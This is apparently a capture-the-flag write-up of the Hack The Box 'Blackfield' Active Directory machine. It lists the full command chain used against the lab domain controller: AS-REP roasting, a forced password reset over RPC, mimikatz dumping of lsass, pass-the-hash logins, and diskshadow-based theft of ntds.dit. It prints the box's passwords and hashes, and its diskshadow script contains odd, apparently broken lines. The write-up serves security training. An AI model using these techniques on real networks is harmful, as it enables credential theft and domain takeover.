---
title: "Hack The Box - Blackfield"
tags: [windows,hard,smb,rpc,bloodhound,forcechangepassword,lsass,mimikatz,SeBackupPrivilege,ntds]
categories: HackTheBox-Active-Directory
---

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Blackfield%20Box%20ccad48e710034cebaaf746bd274bada3/Untitled.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Blackfield%20Box%20ccad48e710034cebaaf746bd274bada3/Untitled.png)

⇒ Blackfield was an hard active directory machine created by **aas** on hackthebox which taught us various things :

- Enumerating valid users using kerbrute with users list from smb
- Kerberoasting and getting user credentials.
- Running python based bloodhound injestor to collect data.
- Running bloodhound and finding out user has ForeChangePassword Privs,
- Abusing ForceChangePassword to change user password using RPC.
- Dumping hashes from lsass.dmp using mimikatz
- SeBackUpPrivilege exploitation for privilege escalation

---

## NMAP

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Blackfield%20Box%20ccad48e710034cebaaf746bd274bada3/Untitled%201.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Blackfield%20Box%20ccad48e710034cebaaf746bd274bada3/Untitled%201.png)

---

## Enumerating

⇒ So we enumerated the smb shares using smbmap and found the following interesting shares. In the **profiles$** share we find a list of users :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Blackfield%20Box%20ccad48e710034cebaaf746bd274bada3/Untitled%202.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Blackfield%20Box%20ccad48e710034cebaaf746bd274bada3/Untitled%202.png)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Blackfield%20Box%20ccad48e710034cebaaf746bd274bada3/Untitled%203.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Blackfield%20Box%20ccad48e710034cebaaf746bd274bada3/Untitled%203.png)

---

### Kerberoasting

⇒ We made a users wordlist from the users we got from the smb share and ran kerbrute to find valid users which we can check for DONT_REQ_PREAUTH and kerberoast them :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Blackfield%20Box%20ccad48e710034cebaaf746bd274bada3/Untitled%204.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Blackfield%20Box%20ccad48e710034cebaaf746bd274bada3/Untitled%204.png)

**python3 [GetNPUsers.py](http://getnpusers.py/) -dc-ip 10.10.10.192 blackfield.local/ -usersfile user.txt**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Blackfield%20Box%20ccad48e710034cebaaf746bd274bada3/Untitled%205.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Blackfield%20Box%20ccad48e710034cebaaf746bd274bada3/Untitled%205.png)

**support : #00^BlackKnight**

---

### Changing AD Users Password Using RPC

⇒ Now we will run bloodhound that will collect the list of computers , users and groups which will help us enumerate further what we can do with this **support** account

Python Based Bloodhound Ingestor : [https://github.com/fox-it/BloodHound.py](https://github.com/fox-it/BloodHound.py)

```bash
python3 /opt/BloodHound.py/bloodhound.py -c all -u support -p '#00^BlackKnight' -d blackfield.local -ns 10.10.10.192
```

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Blackfield%20Box%20ccad48e710034cebaaf746bd274bada3/Untitled%206.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Blackfield%20Box%20ccad48e710034cebaaf746bd274bada3/Untitled%206.png)

- After loading it up in bloodhound we see that user support has **ForceChangePassword** privileges to audit2020 user

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Blackfield%20Box%20ccad48e710034cebaaf746bd274bada3/Untitled%207.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Blackfield%20Box%20ccad48e710034cebaaf746bd274bada3/Untitled%207.png)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Blackfield%20Box%20ccad48e710034cebaaf746bd274bada3/Untitled%208.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Blackfield%20Box%20ccad48e710034cebaaf746bd274bada3/Untitled%208.png)

⇒ So now lets change the password for audit2020 user using rpc as we have the permissions to do so :

Reference : [https://malicious.link/post/2017/reset-ad-user-password-with-linux/](https://malicious.link/post/2017/reset-ad-user-password-with-linux/)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Blackfield%20Box%20ccad48e710034cebaaf746bd274bada3/Untitled%209.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Blackfield%20Box%20ccad48e710034cebaaf746bd274bada3/Untitled%209.png)

**setuserinfo2 audit2020 23 'ASDqwe123'**

⇒ Now we can login to the **forensics** share as audit2020 user as now we have changed the password using rpc :

```bash
smbclient -U audit2020 \\\\10.10.10.192\\forensic
recurse on
prompt off
mget *
```

⇒ We find an file named [lsass.zip](http://lsass.zip) which contains **lsass.dmp** from which we can dump hashes using **mimikatz** and we got the ntlm hash for **svc_backup** user :

Reference : [https://medium.com/@ali.bawazeeer/using-mimikatz-to-get-cleartext-password-from-offline-memory-dump-76ed09fd3330](https://medium.com/@ali.bawazeeer/using-mimikatz-to-get-cleartext-password-from-offline-memory-dump-76ed09fd3330)

```bash
mimikatz # sekurlsa::minidump lsass.dmp
```

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Blackfield%20Box%20ccad48e710034cebaaf746bd274bada3/Untitled%2010.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Blackfield%20Box%20ccad48e710034cebaaf746bd274bada3/Untitled%2010.png)

```bash
mimikatz # sekurlsa::logonPasswords full
```

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Blackfield%20Box%20ccad48e710034cebaaf746bd274bada3/Untitled%2011.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Blackfield%20Box%20ccad48e710034cebaaf746bd274bada3/Untitled%2011.png)

NLTM : 9658d1d1dcd9250115e2205d9f48400d

⇒ We can use the NTLM hash for authentication with evil-winrm as user svc_backup

**evil-winrm -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -i 10.10.10.192**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Blackfield%20Box%20ccad48e710034cebaaf746bd274bada3/Untitled%2012.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Blackfield%20Box%20ccad48e710034cebaaf746bd274bada3/Untitled%2012.png)

---

## Privilege Escalation to DA [ SeBackUpPrivilege ]

⇒ Our user svc_backup has **SeBackUpPrivilege** which we can leverage to yoink ntds.dit :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Blackfield%20Box%20ccad48e710034cebaaf746bd274bada3/Untitled%2013.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Blackfield%20Box%20ccad48e710034cebaaf746bd274bada3/Untitled%2013.png)

Reference : [https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf](https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Blackfield%20Box%20ccad48e710034cebaaf746bd274bada3/Untitled%2014.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Blackfield%20Box%20ccad48e710034cebaaf746bd274bada3/Untitled%2014.png)

⇒ So we will be creating a backup volume for the c drive and then go yoink the ntds.dit. Then use secrets-dump to dump hashes :

```
set metadata C:\Windows\System32\spool\drivers\color\sss.cabs
set context clientaccessibles
set context persistents
begin backups
add volume c: alias mydrives
creates
expose %mydrive% z:s
```

- Uploading the script and running diskshadow

**diskshadow /s c:\Users\svc_backup\enox.txt**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Blackfield%20Box%20ccad48e710034cebaaf746bd274bada3/Untitled%2015.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Blackfield%20Box%20ccad48e710034cebaaf746bd274bada3/Untitled%2015.png)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Blackfield%20Box%20ccad48e710034cebaaf746bd274bada3/Untitled%2016.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Blackfield%20Box%20ccad48e710034cebaaf746bd274bada3/Untitled%2016.png)

- Copying the ntds file and downloading it 

**robocopy /B z:\Windows\ntds .\ntds ntds.dit**
- Downloading the SYSTEM registry file

**reg save HKLM\SYSTEM SYSTEM**
- Finally now we will dump the hashes using impacket-secretsdump

**impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL**

```bash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
```

⇒ Now we have Administrator NTLM hash which we used for authentication with evil-winrm

**evil-winrm -u Administrator -H 184fb5e5178480be64824d4cd53b99ee -i 10.10.10.192**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Blackfield%20Box%20ccad48e710034cebaaf746bd274bada3/Untitled%2017.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Blackfield%20Box%20ccad48e710034cebaaf746bd274bada3/Untitled%2017.png)
